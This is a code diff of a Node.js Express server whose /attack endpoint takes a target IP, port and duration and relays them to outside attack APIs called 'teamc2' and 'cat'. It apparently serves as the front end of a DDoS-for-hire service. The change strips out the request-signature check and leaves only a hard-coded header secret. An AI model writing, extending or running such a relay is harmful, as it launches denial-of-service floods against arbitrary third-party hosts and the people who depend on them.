@@ -11,7 +11,6 @@ process.on("unhandledRejection", err => {
 const express = require("express");
 const axios = require("axios");
 const cors = require("cors");
-const crypto = require("crypto");
 
 const app = express();
 
@@ -22,19 +21,11 @@ app.use(express.json());
 const API_KEY = process.env.API_KEY;
 const PORT = process.env.PORT;
 
-// 🔥 MODE SWITCH (yaha control hoga)
-const MODE = process.env.MODE || "teamc2"; 
-// "teamc2" or "cat"
+// 🔥 MODE SWITCH
+const MODE = process.env.MODE || "teamc2";
 
 console.log("MODE:", MODE);
 console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
-
-// ================= 🔐 SECURITY =================
-const SECRET = "SECRET123";
-
-function sha256(data) {
-  return crypto.createHash("sha256").update(data).digest("hex");
-}
 
 // ================= ROUTES =================
 
@@ -44,7 +35,7 @@ app.post("/attack", async (req, res) => {
   try {
     console.log("➡️ Incoming request");
 
-    // 🔐 basic security
+    // 🔐 basic security (ye rehne de)
     if (req.headers["x-sec"] !== "9xK3pL") {
       return res.status(403).json({ error: "Forbidden" });
     }
@@ -58,10 +49,8 @@ app.post("/attack", async (req, res) => {
     port = Number(port);
     time = Number(time);
 
-    const expected = sha256(ip + port + time + SECRET);
-
-    if (req.headers["x-sign"] !== expected) {
-      return res.status(403).json({ error: "Invalid sign" });
+    if (isNaN(port) || isNaN(time)) {
+      return res.status(400).json({ error: "Invalid port/time" });
     }
 
     // ================= 🔥 SWITCH =================
@@ -69,7 +58,6 @@ app.post("/attack", async (req, res) => {
     let response;
 
     if (MODE === "teamc2") {
-      // 🔹 OLD API
       if (!API_KEY) {
         return res.status(500).json({ error: "API key missing" });
       }
@@ -81,7 +69,6 @@ app.post("/attack", async (req, res) => {
       response = await axios.get(url, { timeout: 10000 });
 
     } else if (MODE === "cat") {
-      // 🔹 NEW API (JSON POST)
       console.log("🌐 CAT API CALL");
 
       response = await axios.post(
